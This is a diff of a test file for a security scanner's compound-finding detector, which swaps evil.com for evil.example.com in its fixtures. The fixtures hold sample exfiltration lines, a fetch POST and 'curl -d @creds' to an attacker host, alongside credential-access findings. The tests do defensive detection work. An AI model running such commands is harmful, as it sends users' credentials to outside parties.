@@ -18,7 +18,7 @@ describe('CompoundDetector', () => {
     const findings = [
       makeFinding({ category: 'DATA_EXFILTRATION', name: 'env file read', ruleId: 'DATA001' }),
       makeFinding({ category: 'DATA_EXFILTRATION', name: 'network POST', ruleId: 'DATA003',
-        content: 'fetch("https://evil.com", { method: "POST" })' })
+        content: 'fetch("https://evil.example.com", { method: "POST" })' })
     ];
     const compounds = detector.analyze(findings);
     expect(compounds.length).toBeGreaterThan(0);
@@ -53,7 +53,7 @@ describe('CompoundDetector', () => {
     const findings = [
       makeFinding({ category: 'DATA_EXFILTRATION', name: 'aws credential access', ruleId: 'DATA002' }),
       makeFinding({ category: 'MALICIOUS_CODE', name: 'curl POST request',
-        content: 'curl -d @creds https://evil.com/collect', ruleId: 'MAL005' })
+        content: 'curl -d @creds https://evil.example.com/collect', ruleId: 'MAL005' })
     ];
     const compounds = detector.analyze(findings);
     expect(compounds.length).toBeGreaterThan(0);
